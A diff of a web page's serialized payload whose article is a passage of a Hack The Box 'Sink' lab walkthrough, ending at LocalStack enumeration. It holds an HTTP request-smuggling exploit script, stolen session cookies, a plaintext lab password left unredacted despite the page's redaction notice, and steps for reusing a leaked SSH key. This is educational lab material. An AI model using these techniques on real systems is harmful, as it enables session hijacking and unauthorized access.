@@ -1,18 +1,20 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-13:I[484,[],"OutletBoundary"]
-14:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Sink Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A CL.TE request-smuggling desync captured the admin session, Gitea history exposed Marcus's SSH key and LocalStack credentials, Secrets Manager supplied David's login, and KMS decrypted the file containing the root password."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:23:19.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-sink-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Sink machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Sink machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sink","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9"]]}],"$La"]}]]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$Lf",null,{"headings":[{"id":"1-approach-to-sink","label":"1. Approach to Sink"},{"id":"2-initial-reconnaissance","label":"2. Initial Reconnaissance"},{"id":"3-understanding-the-attack-surface-port-5000","label":"3. Understanding the Attack Surface: Port 5000"},{"id":"http-request-smuggling","label":"HTTP Request Smuggling"},{"id":"5-capturing-the-admin-cookie","label":"5. Capturing the Admin Cookie"},{"id":"6-accessing-admin-notes-and-credential-harvesting","label":"6. Accessing Admin Notes & Credential Harvesting"},{"id":"7-gitea-enumeration-and-ssh-key-extraction","label":"7. Gitea Enumeration & SSH Key Extraction"},{"id":"8-shell-as-marcus-and-user-flag","label":"8. Shell as Marcus & User Flag"},{"id":"9-aws-localstack-enumeration","label":"9. AWS LocalStack Enumeration"},{"id":"10-pivoting-to-david-via-secrets-manager","label":"10. Pivoting to David via Secrets Manager"},{"id":"11-privilege-escalation-kms-decryption","label":"11. Privilege Escalation: KMS Decryption"},{"id":"12-root-shell-and-root-flag","label":"12. Root Shell & Root Flag"},{"id":"13-key-lessons-and-takeaways","label":"13. Key Lessons & Takeaways"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/d21f05db0cf91e7d865ffa5809e0c6269716449d/HTB-Sink.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit d21f05db0cf9",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Sink, Linux, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sink","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-10:T6e98,<blockquote>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Sink Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A CL.TE request-smuggling desync captured the admin session, Gitea history exposed Marcus's SSH key and LocalStack credentials, Secrets Manager supplied David's login, and KMS decrypted the file containing the root password."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"Sink"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/sink","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Insane"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-sink-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Sink machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Sink machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sink","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:T7af8,<blockquote>
 <p><strong>Machine:</strong> Sink<br><strong>IP:</strong> 10.129.5.161<br><strong>Difficulty:</strong> Insane<br><strong>OS:</strong> Linux<br><strong>Key Concepts:</strong> HTTP Request Smuggling (CL.TE Desync), AWS LocalStack Exploitation, Secrets Manager, KMS Decryption  </p>
 </blockquote>
 <hr>
@@ -38,18 +40,18 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <h3 id="2-1-why-recon-matters">2.1 Why Recon Matters</h3>
 <p>You cannot exploit what you do not understand. The goal of recon is not just to find open ports - it's to <strong>build a mental map of the target's architecture</strong>. Every version number, every response header, every service banner is a clue.</p>
 <h3 id="2-2-full-tcp-port-scan">2.2 Full TCP Port Scan</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA sink_alltcp 10.129.5.161
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA sink_alltcp 10.129.5.161
 </code></pre>
 <p><strong>Why <code>--min-rate 10000</code>?</strong><br>HackTheBox machines can be slow to scan. We speed things up by telling nmap to maintain a high packet rate. This sacrifices some stealth for speed, which is acceptable in a CTF environment.</p>
 <p><strong>Result:</strong></p>
-<pre><code>PORT     STATE SERVICE
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT     STATE SERVICE
 22/tcp   open  ssh
 3000/tcp open  ppp
 5000/tcp open  upnp
 </code></pre>
 <p>Three ports. SSH is always worth noting, but the real story is ports 3000 and 5000.</p>
 <h3 id="2-3-service-version-detection">2.3 Service Version Detection</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p 22,3000,5000 -sC -sV -oA sink_tcpscripts 10.129.5.161
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">nmap -p 22,3000,5000 -sC -sV -oA sink_tcpscripts 10.129.5.161
 </code></pre>
 <p><strong>Why <code>-sC</code> and <code>-sV</code>?</strong><br><code>-sC</code> runs default NSE scripts that often reveal banners, certificates, and common misconfigurations. <code>-sV</code> probes services to determine their exact version. Version numbers are critical because they tell us what exploits might exist.</p>
 <p><strong>Key findings:</strong></p>
@@ -82,10 +84,10 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <li>Comment functionality</li>
 </ul>
 <h3 id="3-4-http-headers-tell-a-story">3.4 HTTP Headers Tell a Story</h3>
-<pre><code class="language-bash" data-language="bash">curl -I http://10.129.5.161:5000/
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">curl -I http://10.129.5.161:5000/
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code class="language-http" data-language="http">HTTP/1.1 200 OK
+<pre tabindex="0" aria-label="http code or terminal block 5"><code class="language-http" data-language="http">HTTP/1.1 200 OK
 Server: gunicorn/20.0.0
 Via: haproxy
 X-Served-By: ff0c84e62bfa
@@ -97,16 +99,16 @@ X-Served-By: ff0c84e62bfa
 <li><code>Server: gunicorn/20.0.0</code> → Confirms the vulnerable version.</li>
 </ul>
 <p><strong>The architecture we're facing:</strong></p>
-<pre><code>[Attacker] → [HAProxy] → [Gunicorn] → [Flask App]
+<pre tabindex="0" aria-label="Code or terminal block 6"><code>[Attacker] → [HAProxy] → [Gunicorn] → [Flask App]
 </code></pre>
 <p>This is the <strong>exact architecture</strong> vulnerable to HTTP Request Smuggling.</p>
 <h3 id="3-5-confirming-haproxy-version">3.5 Confirming HAProxy Version</h3>
 <p>Send a malformed request to trigger HAProxy's error response:</p>
-<pre><code class="language-bash" data-language="bash"># In Burp Repeater or via netcat
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash"># In Burp Repeater or via netcat
 echo -e "GET / HTTP/1.1\r\nHost: 10.129.5.161:5000\r\nUser" | nc 10.129.5.161 5000
 </code></pre>
 <p><strong>Response:</strong></p>
-<pre><code class="language-http" data-language="http">HTTP/1.0 400 Bad request
+<pre tabindex="0" aria-label="http code or terminal block 8"><code class="language-http" data-language="http">HTTP/1.0 400 Bad request
 Server: haproxy 1.9.10
 </code></pre>
 <p> HAProxy 1.9.10 has a known issue where it mishandles certain Transfer-Encoding header variations. This is our smoking gun.</p>
@@ -129,13 +131,13 @@ Server: haproxy 1.9.10
 <p><strong>How?</strong> We send a malformed <code>Transfer-Encoding</code> header that HAProxy doesn't recognize but Gunicorn does.</p>
 <h3 id="4-3-the-magic-byte-x0b">4.3 The Magic Byte: <code>\x0b</code></h3>
 <p>The key is the vertical tab character (<code>\x0b</code>, ASCII 11). When we send:</p>
-<pre><code class="language-http" data-language="http">Transfer-Encoding: \x0bchunked
+<pre tabindex="0" aria-label="http code or terminal block 9"><code class="language-http" data-language="http">Transfer-Encoding: \x0bchunked
 </code></pre>
 <p><strong>HAProxy sees:</strong> The header value starts with a weird control character. It considers the header invalid and falls back to <code>Content-Length</code>.</p>
 <p><strong>Gunicorn sees:</strong> It strips the <code>\x0b</code> and sees <code>Transfer-Encoding: chunked</code>. It ignores <code>Content-Length</code> and processes the body as chunked.</p>
 <h3 id="4-4-visualizing-the-attack">4.4 Visualizing the Attack</h3>
 <p><strong>What HAProxy sees (one request):</strong></p>
-<pre><code class="language-http" data-language="http">GET / HTTP/1.1
+<pre tabindex="0" aria-label="http code or terminal block 10"><code class="language-http" data-language="http">GET / HTTP/1.1
 Host: 10.129.5.161:5000
 Content-Length: 230
 Transfer-Encoding: [invalid]
@@ -151,7 +153,7 @@ note=
 </code></pre>
 <p>HAProxy says: "The body is 230 bytes. I'll forward all of it as one request."</p>
 <p><strong>What Gunicorn sees (two requests):</strong></p>
-<pre><code class="language-http" data-language="http">GET / HTTP/1.1
+<pre tabindex="0" aria-label="http code or terminal block 11"><code class="language-http" data-language="http">GET / HTTP/1.1
 Host: 10.129.5.161:5000
 Content-Length: 230
 Transfer-Encoding: chunked
@@ -159,7 +161,7 @@ Transfer-Encoding: chunked
 0
 </code></pre>
 <p>Gunicorn sees the terminating chunk <code>0\r\n\r\n</code>. Request 1 is complete. Then it sees:</p>
-<pre><code class="language-http" data-language="http">POST /notes HTTP/1.1
+<pre tabindex="0" aria-label="http code or terminal block 12"><code class="language-http" data-language="http">POST /notes HTTP/1.1
 Host: 10.129.5.161:5000
 Cookie: session=OUR_COOKIE
 Content-Length: 300
@@ -175,7 +177,7 @@ note=
 <h2 id="5-capturing-the-admin-cookie">5. Capturing the Admin Cookie</h2>
 <h3 id="5-1-building-the-smuggle-script">5.1 Building the Smuggle Script</h3>
 <p>We cannot use <code>curl</code> or <code>requests</code> because they create well-formed HTTP requests. We need raw socket access to inject the <code>\x0b</code> character exactly where we want it.</p>
-<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
+<pre tabindex="0" aria-label="python code or terminal block 13"><code class="language-python" data-language="python">#!/usr/bin/env python3
 import socket
 import time
 
@@ -219,7 +221,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 <h3 id="5-2-why-we-need-to-retry">5.2 Why We Need to Retry</h3>
 <p>This is a <strong>race condition</strong>. The bot hits periodically. Your source IP is pinned to one of 16 containers. The bot eventually hits your container, but you don't know exactly when.</p>
 <p><strong>The self-trigger enhancement:</strong> We discovered that sending a second request immediately after the smuggle increases reliability. Even if our trigger doesn't get captured, it seems to help "prime" the backend connection.</p>
-<pre><code class="language-python" data-language="python"># Self-trigger variant
+<pre tabindex="0" aria-label="python code or terminal block 14"><code class="language-python" data-language="python"># Self-trigger variant
 def trigger():
     time.sleep(0.3)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -230,10 +232,10 @@ def trigger():
 </code></pre>
 <h3 id="5-3-success">5.3 Success!</h3>
 <p>After running the smuggle script, we check our notes:</p>
-<pre><code class="language-bash" data-language="bash">curl -s -b "session=eyJlbWFpbCI6InRlc3RAdGVzdC50ZXN0In0.ahlj8A.XLe99ASkUHm1NbjqXAr4F3Fq-Mk" http://10.129.5.161:5000/notes
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">curl -s -b "session=eyJlbWFpbCI6InRlc3RAdGVzdC50ZXN0In0.ahlj8A.XLe99ASkUHm1NbjqXAr4F3Fq-Mk" http://10.129.5.161:5000/notes
 </code></pre>
 <p>A new note appears! Viewing it reveals:</p>
-<pre><code>GET /notes/delete/1234 HTTP/1.1
+<pre tabindex="0" aria-label="Code or terminal block 16"><code>GET /notes/delete/1234 HTTP/1.1
 Host: 127.0.0.1:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept-Encoding: gzip, deflate
@@ -248,21 +250,21 @@ X-Forwarded-For: 127.0.0.1
 <p>A session cookie is the digital equivalent of someone leaving their ID badge on a table. We didn't break the authentication - we just borrowed someone else's already-authenticated session.</p>
 <h3 id="6-2-accessing-admin-notes">6.2 Accessing Admin Notes</h3>
 <p>Using the stolen admin cookie:</p>
-<pre><code class="language-bash" data-language="bash">curl -s -b "session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.ahlhiA.XhLiBR0qoVPI4k7xAlXaZwdi43A" http://10.129.5.161:5000/notes
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">curl -s -b "session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.ahlhiA.XhLiBR0qoVPI4k7xAlXaZwdi43A" http://10.129.5.161:5000/notes
 </code></pre>
 <p>The admin has three notes:</p>
 <p><strong>Note 1:</strong></p>
-<pre><code>Chef Login : http://chef.sink.htb
+<pre tabindex="0" aria-label="Code or terminal block 18"><code>Chef Login : http://chef.sink.htb
 Username : chefadm
 Password : REDACTED
 </code></pre>
 <p><strong>Note 2:</strong></p>
-<pre><code>Dev Node URL : http://code.sink.htb
+<pre tabindex="0" aria-label="Code or terminal block 19"><code>Dev Node URL : http://code.sink.htb
 Username : root
 Password : REDACTED
 </code></pre>
 <p><strong>Note 3:</strong></p>
-<pre><code>Nagios URL : https://nagios.sink.htb
+<pre tabindex="0" aria-label="Code or terminal block 20"><code>Nagios URL : https://nagios.sink.htb
 Username : nagios_adm
 Password : REDACTED
 </code></pre>
@@ -284,14 +286,14 @@ Password : REDACTED
 <p>The <code>Key_Management</code> repo is the obvious target. The name suggests "keys inside."</p>
 <h3 id="7-3-commit-history-analysis">7.3 Commit History Analysis</h3>
 <p>Using the Gitea web UI or API, we examine commits:</p>
-<pre><code class="language-bash" data-language="bash"># Clone the repo with basic auth to avoid URL encoding issues with special chars
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash"># Clone the repo with basic auth to avoid URL encoding issues with special chars
 git -c http.extraHeader="Authorization: Basic $(echo -n 'root:FaH@3L&gt;Z3})zzfQ3' | base64 -w0)" \
   clone http://10.129.5.161:3000/root/Key_Management.git
 </code></pre>
-<pre><code class="language-bash" data-language="bash">cd Key_Management &amp;&amp; git log --oneline
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">cd Key_Management &amp;&amp; git log --oneline
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>86ca6d1 rotation fix on dev
+<pre tabindex="0" aria-label="Code or terminal block 23"><code>86ca6d1 rotation fix on dev
 3e22d98 endpoint fix
 f380655 Preparing for Prod
 b01a6b7 Adding EC2 Key Management Structure
@@ -303,17 +305,17 @@ ae23ca5 Initial commit
 </code></pre>
 <h3 id="7-4-the-key-evidence-deleted-files">7.4 the key evidence: Deleted Files</h3>
 <p>Check what was deleted in "Preparing for Prod":</p>
-<pre><code class="language-bash" data-language="bash">git show f380655 --name-status
+<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">git show f380655 --name-status
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>D       .keys/dev_keys
+<pre tabindex="0" aria-label="Code or terminal block 25"><code>D       .keys/dev_keys
 M       ec2.php
 </code></pre>
 <p>A file called <code>.keys/dev_keys</code> was deleted! Recover it from the previous commit:</p>
-<pre><code class="language-bash" data-language="bash">git show b01a6b7:.keys/dev_keys
+<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">git show b01a6b7:.keys/dev_keys
 </code></pre>
 <p><strong>Output:</strong> An SSH private key!</p>
-<pre><code>[redacted retired-lab private key]
+<pre tabindex="0" aria-label="Code or terminal block 27"><code>[redacted retired-lab private key]
 </code></pre>
 <h3 id="7-5-mechanism">7.5 Mechanism</h3>
 <p>Developers often think "delete the file, commit, problem solved." But Git is a time machine. Every commit, every file, every line is preserved forever (unless you explicitly rewrite history with <code>git filter-branch</code> or <code>BFG Repo-Cleaner</code>).</p>
@@ -322,21 +324,21 @@ M       ec2.php
 <h2 id="8-shell-as-marcus-and-user-flag">8. Shell as Marcus &amp; User Flag</h2>
 <h3 id="8-1-setting-up-the-key">8.1 Setting Up the Key</h3>
 <p>Save the key with proper permissions (SSH refuses to use keys that are too permissive):</p>
-<pre><code class="language-bash" data-language="bash">cat &gt; marcus_key &lt;&lt; 'EOF'
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">cat &gt; marcus_key &lt;&lt; 'EOF'
 [redacted retired-lab private key]
 EOF
 
 chmod 600 marcus_key
 </code></pre>
 <h3 id="8-2-ssh-as-marcus">8.2 SSH as Marcus</h3>
-<pre><code class="language-bash" data-language="bash">ssh -i marcus_key marcus@10.129.5.161
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">ssh -i marcus_key marcus@10.129.5.161
 </code></pre>
 <p><strong>Success!</strong></p>
-<pre><code>marcus@sink:~$ id
+<pre tabindex="0" aria-label="Code or terminal block 30"><code>marcus@sink:~$ id
 uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
 </code></pre>
 <h3 id="8-3-user-flag">8.3 User Flag</h3>
-<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">cat ~/user.txt
 </code></pre>
 <p><strong>User Flag:</strong> <code>4dc937[redacted]93defdb7</code></p>
 <hr>
@@ -344,10 +346,10 @@ uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
 <h3 id="9-1-local-services">9.1 Local services</h3>
 <p>As marcus, we run <code>ps aux</code> and see Docker containers. One of them is running <code>localstack</code>. LocalStack is a fully functional local AWS cloud stack used for development and testing. But to a hacker, it's a <strong>useful source of cloud services</strong> running with default/weak credentials.</p>
 <h3 id="9-2-confirming-localstack">9.2 Confirming LocalStack</h3>
-<pre><code class="language-bash" data-language="bash">curl http://127.0.0.1:4566/health
+<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash">curl http://127.0.0.1:4566/health
